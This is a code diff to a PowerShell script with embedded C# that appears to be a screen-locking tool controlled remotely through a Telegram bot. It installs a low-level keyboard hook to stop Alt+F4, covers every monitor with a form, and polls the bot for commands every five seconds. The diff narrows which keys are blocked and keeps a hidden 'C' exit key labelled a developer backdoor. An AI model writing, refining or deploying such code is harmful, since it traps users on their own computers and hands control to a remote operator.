@@ -27,7 +27,7 @@ function Send-Telegram-Message {
 
 Send-Telegram-Message
 
-# IMPROVED LOW-LEVEL KEYBOARD HOOK CLASS (Blocks ALT+F4, ALT, Win, Tab, Esc)
+# KEYBOARD BLOCKER: Reliable Alt+F4 prevent only
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -42,6 +42,7 @@ public class KeyBlocker {
     private const int WM_SYSKEYDOWN = 0x0104;
     private const int WM_KEYUP = 0x0101;
     private const int WM_SYSKEYUP = 0x0105;
+
     private static bool altPressed = false;
 
     [DllImport("user32.dll")]
@@ -68,21 +69,18 @@ public class KeyBlocker {
             int vkCode = Marshal.ReadInt32(lParam);
 
             if (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN) {
-                if (vkCode == 0x43) Environment.Exit(0); // C key closes app
+                // C closes app (developer backdoor)
+                if (vkCode == 0x43) Environment.Exit(0);
 
-                if (vkCode == 0x12) altPressed = true; // ALT pressed
+                // ALT key tracking
+                if (vkCode == 0x12) altPressed = true;
 
-                // Explicitly block Alt+F4
-                if (altPressed && vkCode == 0x73)
-                    return (IntPtr)1;
-
-                // Block Windows keys, ALT, Tab, Esc individually
-                if (vkCode == 0x09 || vkCode == 0x1B || vkCode == 0x5B || vkCode == 0x5C || vkCode == 0x12)
-                    return (IntPtr)1;
+                // Block Alt+F4
+                if ((vkCode == 0x73) && altPressed) return (IntPtr)1;
             }
 
             if (wParam == (IntPtr)WM_KEYUP || wParam == (IntPtr)WM_SYSKEYUP) {
-                if (vkCode == 0x12) altPressed = false; // ALT released
+                if (vkCode == 0x12) altPressed = false;
             }
         }
         return CallNextHookEx(hookId, nCode, wParam, lParam);
@@ -119,7 +117,7 @@ $forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
     $form
 }
 
-# TELEGRAM LISTENER WITH TIMER (Stable offset)
+# TELEGRAM LISTENER WITH TIMER
 $offset = 0
 try {
     $initialUpdates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates" -UseBasicParsing -TimeoutSec 5
@@ -129,7 +127,7 @@ try {
 } catch { }
 
 $timer = New-Object System.Windows.Forms.Timer
-$timer.Interval = 5000 # check every 5 seconds
+$timer.Interval = 5000
 $timer.Add_Tick({
     try {
         $url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
@@ -147,6 +145,6 @@ $timer.Start()
 # START APP LOOP
 [System.Windows.Forms.Application]::Run()
 
-# CLEANUP ON EXIT
+# CLEANUP
 $timer.Stop()
 [KeyBlocker]::Unblock()
